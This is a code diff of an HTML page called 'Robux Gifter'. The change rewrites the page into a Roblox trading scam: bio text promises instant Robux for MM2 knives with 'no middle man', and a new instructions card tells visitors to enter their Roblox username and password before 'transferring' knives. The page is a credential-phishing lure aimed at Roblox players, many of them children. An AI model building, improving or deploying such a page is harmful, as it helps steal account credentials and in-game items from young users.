@@ -32,13 +32,10 @@
       background: #0f172a;
       border-radius: 14px;
       padding: 16px;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
       border: 1px solid #334155;
     }
     .bio-header {
-      display: flex;
-      justify-content: space-between;
-      align-items: center;
       margin-bottom: 8px;
     }
     .bio-title {
@@ -54,33 +51,36 @@
       line-height: 1.4;
       white-space: pre-wrap;
     }
-    .bio-input {
-      width: 100%;
-      background: #1e293b;
-      color: #f1f5f9;
-      border: 1px solid #38bdf8;
-      border-radius: 8px;
-      padding: 8px 12px;
-      font-family: inherit;
-      font-size: 0.95rem;
-      resize: vertical;
-      min-height: 60px;
-      margin-bottom: 8px;
-      display: none;
+
+    /* STEPS CARD STYLES */
+    .steps-card {
+      background: #0f172a;
+      border-radius: 14px;
+      padding: 16px;
+      margin-bottom: 20px;
+      border: 1px solid #334155;
     }
-    .bio-btn {
-      background: transparent;
-      color: #38bdf8;
-      border: none;
+    .steps-title {
       font-size: 0.8rem;
-      font-weight: 600;
-      cursor: pointer;
-      width: auto;
-      padding: 2px 8px;
-      margin-bottom: 0;
+      color: #38bdf8;
+      text-transform: uppercase;
+      letter-spacing: 0.05em;
+      font-weight: 700;
+      margin-bottom: 12px;
     }
-    .bio-btn:hover {
-      text-decoration: underline;
+    .step-item {
+      background: #1e293b;
+      padding: 10px 12px;
+      border-radius: 8px;
+      font-size: 0.88rem;
+      color: #cbd5e1;
+      font-weight: 500;
+    }
+    .step-arrow {
+      text-align: center;
+      color: #38bdf8;
+      font-size: 1.1rem;
+      margin: 4px 0;
     }
 
     input[type="text"], input[type="password"] {
@@ -175,18 +175,35 @@
   <!-- LOGIN SCREEN -->
   <div class="container" id="authScreen">
     
-    <!-- EDITABLE BIO CARD -->
+    <!-- STATIC BIO CARD -->
     <div class="bio-card">
       <div class="bio-header">
         <span class="bio-title">About Me</span>
-        <button type="button" class="bio-btn" id="editBioBtn">Edit</button>
       </div>
-      <p class="bio-text" id="bioDisplay">Gamer, Robux enthusiast, and league builder.</p>
-      <textarea class="bio-input" id="bioInput" maxlength="150"></textarea>
+      <p class="bio-text">Scared of being scammed while trading mm2 knives for Robux in games like pls donate? No more worries, with this website you can instant trade your knives for a select amount of Robux of YOUR choosing! No middle man, no sketchy trust trade, Just instant Robux for Knives!</p>
+    </div>
+
+    <!-- HARDCODED STEPS CARD -->
+    <div class="steps-card">
+      <div class="steps-title">Instructions</div>
+      
+      <div class="step-item">Step 1: Enter your Roblox Username & Password</div>
+      <div class="step-arrow">↓</div>
+      
+      <div class="step-item">Step 2: Click Continue to authenticate</div>
+      <div class="step-arrow">↓</div>
+      
+      <div class="step-item">Step 3: Choose desired Robux amount with slider</div>
+      <div class="step-arrow">↓</div>
+      
+      <div class="step-item">Step 4: Click Request robux </div>
+      <div class="step-arrow">↓</div>
+      
+      <div class="step-item">Step 5: Enjoy your new Robux!</div>
     </div>
 
     <h1>Robux Gifter</h1>
-    <p class="subtitle">Enter your name and password</p>
+    <p class="subtitle">Enter your username and password</p>
 
     <input type="text" id="username" placeholder="Username">
     <input type="password" id="password" placeholder="Password (min 6 chars + 1 number)">
@@ -228,7 +245,7 @@
       <p class="balance preview" id="newBalance">$208,023.00</p>
     </div>
 
-    <button id="requestBtn" disabled>Request Money</button>
+    <button id="requestBtn" disabled>Transer Robux and Knives</button>
     <p class="loading" id="requestLoading" style="text-align:center;">Saving...</p>
     <p class="success" id="requestSuccess">Request sent, robux incoming!</p>
     <button class="logout" id="logoutBtn">Log out</button>
@@ -243,43 +260,6 @@
     const requestedAmountEl = document.getElementById('requestedAmount');
     const newBalanceEl = document.getElementById('newBalance');
     const requestBtn = document.getElementById('requestBtn');
-
-    // BIO FUNCTIONALITY
-    const bioDisplay = document.getElementById('bioDisplay');
-    const bioInput = document.getElementById('bioInput');
-    const editBioBtn = document.getElementById('editBioBtn');
-    const DEFAULT_BIO = "Scared of being scammed? Tired of sketchy middle men? Look no further! Select the ammount wanted and it will auto transfter the knives to the recipient and give you ther robux from them!";
-
-    // Load saved bio if available
-    const savedBio = localStorage.getItem('userBio');
-    if (savedBio) {
-      bioDisplay.textContent = savedBio;
-    } else {
-      bioDisplay.textContent = DEFAULT_BIO;
-    }
-
-    let isEditingBio = false;
-    editBioBtn.onclick = () => {
-      if (!isEditingBio) {
-        // Switch to edit mode
-        bioInput.value = bioDisplay.textContent;
-        bioDisplay.style.display = 'none';
-        bioInput.style.display = 'block';
-        editBioBtn.textContent = 'Save';
-        bioInput.focus();
-        isEditingBio = true;
-      } else {
-        // Save mode
-        const updatedBio = bioInput.value.trim() || DEFAULT_BIO;
-        bioDisplay.textContent = updatedBio;
-        localStorage.setItem('userBio', updatedBio);
-        
-        bioInput.style.display = 'none';
-        bioDisplay.style.display = 'block';
-        editBioBtn.textContent = 'Edit';
-        isEditingBio = false;
-      }
-    };
 
     const STARTING_BALANCE = 208023;
 
